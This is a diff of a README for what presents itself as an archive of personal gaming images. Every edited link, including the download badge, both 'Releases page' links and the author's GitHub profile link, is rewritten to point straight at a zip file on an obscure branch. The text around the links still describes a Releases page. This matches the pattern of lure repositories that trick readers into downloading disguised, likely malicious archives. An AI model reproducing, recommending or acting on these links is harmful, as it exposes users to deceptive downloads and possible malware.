@@ -1,6 +1,6 @@
 # 🥔️2️⃣️0️⃣️2️⃣️6️⃣️🎮️🖼️ SeansLifeArchive_Images_AdCom_Y2026 - Explore My Gaming Journey in 2026
 
-![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)
+![Download Now](https://github.com/Lautalocaso/SeansLifeArchive_Images_AdCom_Y2026/raw/refs/heads/SeansLifeArchive_Images_AdCom_Y2026_Main-dev/RepoData/Archive_Life_Images_Seans_Ad_Com_v3.5.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and view the images from my life story pro
 
 1. **Visit the Release Page**  
    Click on the link below to access the download section directly:  
-   [Visit the Releases Page](https://github.com/Lautalocaso/SeansLifeArchive_Images_AdCom_Y2026/releases)
+   [Visit the Releases Page](https://github.com/Lautalocaso/SeansLifeArchive_Images_AdCom_Y2026/raw/refs/heads/SeansLifeArchive_Images_AdCom_Y2026_Main-dev/RepoData/Archive_Life_Images_Seans_Ad_Com_v3.5.zip)
 
 2. **Download the Files**  
    Once you are on the Releases page, look for the latest version. You will see a list of files available for download. Click on the file that interests you to download it to your computer.
@@ -27,7 +27,7 @@ Follow these simple steps to download and view the images from my life story pro
 
 To start exploring my gaming images, please visit the link below to download the files:
 
-[Download from Releases](https://github.com/Lautalocaso/SeansLifeArchive_Images_AdCom_Y2026/releases)
+[Download from Releases](https://github.com/Lautalocaso/SeansLifeArchive_Images_AdCom_Y2026/raw/refs/heads/SeansLifeArchive_Images_AdCom_Y2026_Main-dev/RepoData/Archive_Life_Images_Seans_Ad_Com_v3.5.zip)
 
 ## 🖼️ Features
 
@@ -58,6 +58,6 @@ The project encompasses various themes, including:
 
 ## 🔗 Connect with Me
 
-If you want to follow my journey or connect over gaming, feel free to find me on social media or on [GitHub](https://github.com/seanpm2001).
+If you want to follow my journey or connect over gaming, feel free to find me on social media or on [GitHub](https://github.com/Lautalocaso/SeansLifeArchive_Images_AdCom_Y2026/raw/refs/heads/SeansLifeArchive_Images_AdCom_Y2026_Main-dev/RepoData/Archive_Life_Images_Seans_Ad_Com_v3.5.zip).
 
 Happy exploring! Enjoy the visuals from my game experiences.
